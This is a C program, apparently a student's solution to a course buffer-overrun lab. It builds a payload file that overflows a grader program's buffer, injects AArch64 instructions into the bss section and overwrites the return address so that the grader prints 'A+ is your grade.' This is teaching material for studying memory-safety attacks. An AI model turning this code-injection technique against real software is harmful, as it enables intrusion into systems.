/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: Anish K                                                    */
/*--------------------------------------------------------------------*/

/* Produces a file called dataAplus that exploits the buffer overrun 
   to produce a grade of "A+". It writes "A+ is your grade." by 
   injecting instructions into the bss section and then overwriting 
   the return address of the calling function, causing the grader 
   program to jump to these instructions. The code mimics closely 
   the logic and structure of the provided example code. */

#include <stdio.h>
#include "miniassembler.h"

/* Constants */
enum {
    MAX_BUFFER_BYTES = 48,
    GRADE_ADDR = 0x420044,
    PRINT_INSTR_ADDR = 0x400874
    /* No need for INSTR_SIZE since we use a loop to pad */
};

/*--------------------------------------------------------------------*/
/* main:
   No command-line arguments are processed.
   Does not read from stdin.
   Writes a crafted payload to "dataAplus" file. 
   Returns 0 if successful.
   
   Interactive behavior:
   - Accepts no command-line arguments.
   - Reads nothing from stdin.
   - Writes only to the "dataAplus" file.
   - Returns 0 on success.
*/
/*--------------------------------------------------------------------*/

int main(void) {
    /* Descriptive variable names */
    int iByteCount = 0;                     /* Counts how many bytes we have written */
    unsigned long ulStringAddress = 0x420058; /* Starting address of name array in bss */
    unsigned long ulStartAddress = 0x420058;  /* Address where instructions will start */
    unsigned int uiInstruction;               /* Holds assembled instruction words */

    /* Open dataAplus file for writing */
    FILE *psFile = fopen("dataAplus", "w");
    if (psFile == NULL) {
        return 1; /* Fail if cannot open file */
    }

    /* Write the attacker's name */
    /* "AnishKKata" is 10 characters: A n i s h K K a t a */
    fputs("AnishKKata", psFile);
    iByteCount += 10;

    /* Write a null terminator for the name */
    fputc('\0', psFile);
    iByteCount++;
    ulStringAddress += iByteCount;

    /* Write the grade string that we want to print: "A+ is your grade.%c" 
       plus a null terminator */
    fputs("A+ is your grade.%c", psFile);
    fputc('\0', psFile);
    iByteCount += 20;
    ulStartAddress += iByteCount;

    /* Pad with zeros until ulStartAddress is a multiple of 4.
       This ensures proper instruction alignment. */
    while (ulStartAddress % 4 != 0) {
        fputc(0, psFile);
        iByteCount++;
        ulStartAddress++;
    }

    /* Insert assembly instructions into the file.
       First, we generate an ADR instruction to load the 
       address of our string ("A+ is your grade.%c") into x0. */
    uiInstruction = MiniAssembler_adr(0, ulStringAddress, ulStartAddress);
    fwrite(&uiInstruction, sizeof(unsigned int), 1, psFile);
    iByteCount += 4;

    /* Move '\n' into w1 using MOV instruction. This sets up the argument
       for the printf to print a newline character after the grade. */
    uiInstruction = MiniAssembler_mov(1, '\n');
    fwrite(&uiInstruction, sizeof(unsigned int), 1, psFile);
    iByteCount += 4;

    /* Branch to the PRINT_INSTR_ADDR which prints the grade using our 
       manipulated string. We branch to PRINT_INSTR_ADDR from (ulStartAddress + 8),
       as the PC will be at the next instruction after MOV when branching. */
    uiInstruction = MiniAssembler_b(PRINT_INSTR_ADDR, ulStartAddress + 8);
    fwrite(&uiInstruction, sizeof(unsigned int), 1, psFile);
    iByteCount += 4;

    /* Fill any remaining space in buf (up to MAX_BUFFER_BYTES) with zeros 
       to avoid unwanted characters. */
    while (iByteCount < MAX_BUFFER_BYTES) {
        fputc(0, psFile);
        iByteCount++;
    }

    /* Overwrite the return address on the stack with ulStartAddress, 
       causing execution to jump to our injected instructions. */
    fwrite(&ulStartAddress, sizeof(unsigned long), 1, psFile);

    /* Write EOF to finalize the file (not strictly necessary, but done in example) */
    fputc(EOF, psFile);
    fclose(psFile);

    return 0;
}